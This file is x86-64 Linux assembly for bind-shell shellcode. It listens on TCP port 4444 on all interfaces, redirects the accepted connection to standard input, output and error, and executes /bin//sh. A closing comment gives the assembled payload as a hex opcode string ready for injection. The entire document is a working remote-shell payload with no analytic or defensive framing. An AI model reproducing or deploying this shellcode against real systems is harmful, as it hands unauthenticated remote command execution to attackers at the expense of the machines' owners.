global _start

_start:
    xor rax, rax ; padding in rax
    push rax
    mov rax, 0x000000005C110002 ; 0.0.0.0 4444
    push rax
    call socket
    call bind
    call listen
    call accept 
    jmp dup2first


socket:
    mov rax, 0x29
    mov rdi, 2
    mov rsi, 1 ; sock stream
    mov rdx, 0
    syscall
    ret

bind:
    mov rdi, rax ; sock fd in rdi
    mov rax, 0x31
    lea rsi, [rsp+8] ; pointer to our address in the stack
    mov rdx, 0x10 ; size of the struct (16)
    syscall 
    ret

listen:
    mov rax, 0x32
    ; rdi is still the sockfd
    mov rsi, 1 ; waiting queue
    syscall
    ret

accept:
    mov rax, 0x2b
    ; rdi is still the sockfd
    mov rsi, 0
    mov rdx, 0
    syscall
    mov r10, rax ; save the new fd in r10 to not use the stack
    ret

dup2first:
    mov rdi, r10 ; oldfd = acceptfd
    xor rsi, rsi ; (newfd = STDIN)
    mov rax, 33
    syscall

dup2sec:
    mov rdi, r10 
    mov rsi, 1 ; (newfd = STDOUT)
    mov rax, 33
    syscall

dup2third:
    mov rdi, r10 
    mov rsi, 2 ; (newfd = STDERR)
    mov rax, 33
    syscall

execve:                     
    xor rax, rax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall 

; 4831c050b80200115c50e811000000e823000000e833000000e83b000000
; eb4eb829000000bf02000000be01000000ba000000000f05c34889c7b831
; 000000488d742408ba100000000f05c3b832000000be010000000f05c3b8
; 2b000000be00000000ba000000000f054989c2c34c89d74831f6b8210000
; 000f054c89d7be01000000b8210000000f054c89d7be02000000b8210000
; 000f054831c05048bf2f62696e2f2f7368574889e74831f64831d2b03b0f
; 05
